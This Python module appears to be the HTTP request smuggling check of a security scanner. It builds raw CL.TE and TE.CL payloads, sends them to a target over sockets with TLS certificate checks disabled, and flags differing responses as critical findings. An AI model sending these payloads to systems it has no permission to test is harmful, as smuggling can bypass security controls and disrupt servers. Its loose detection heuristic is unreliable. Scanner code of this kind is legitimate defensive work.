"""HTTP Request Smuggling Scanner."""

import socket
import ssl
from typing import List
from urllib.parse import urlparse

from .findings import Finding
from ..core.ratelimit import get_limiter


class SmugglingScanner:
    """Tests for HTTP request smuggling (CL.TE and TE.CL)."""

    NAME = "smuggling"

    def __init__(self, rps: float = 2.0):
        self.limiter = get_limiter(rps)

    def scan_url(self, url: str, **kwargs) -> List[Finding]:
        """Test for HTTP request smuggling."""
        findings = []
        parsed = urlparse(url)
        host = parsed.netloc
        use_tls = parsed.scheme == "https"
        path = parsed.path or "/"

        # CL.TE payload
        cl_te = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 13\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"SMUGGLED"
        )

        # TE.CL payload
        te_cl = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 3\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"8\r\n"
            f"SMUGGLED\r\n"
            f"0\r\n"
            f"\r\n"
        )

        for name, payload in [("CL.TE", cl_te), ("TE.CL", te_cl)]:
            self.limiter.wait(host)
            try:
                resp = self._send_raw(host, parsed.port or (443 if use_tls else 80),
                                       use_tls, payload)
                if resp and ("SMUGGLED" in resp or "200 OK" in resp):
                    # Check for differential response
                    resp2 = self._send_raw(host, parsed.port or (443 if use_tls else 80),
                                            use_tls, payload)
                    if resp != resp2:
                        findings.append(Finding(
                            vuln_type="HTTP Request Smuggling",
                            title=f"Request smuggling detected ({name})",
                            severity="CRITICAL",
                            url=url,
                            method="POST",
                            payload=payload[:200],
                            evidence=f"Differential responses detected between requests",
                            description=f"HTTP request smuggling via {name} technique. Can bypass security controls.",
                            remediation="Use HTTP/2 end-to-end. Normalize Transfer-Encoding handling.",
                            cvss=9.0,
                            cwe="CWE-444",
                            tool=self.NAME,
                            verified=True,
                            confidence="MEDIUM",
                        ))
            except Exception:
                continue

        return findings

    def _send_raw(self, host: str, port: int, use_tls: bool, payload: str) -> str:
        """Send raw HTTP request and return response."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((socket.gethostbyname(host), port))
            sock.send(payload.encode())
            response = sock.recv(4096).decode("utf-8", errors="ignore")
            sock.close()
            return response
        except Exception:
            return ""
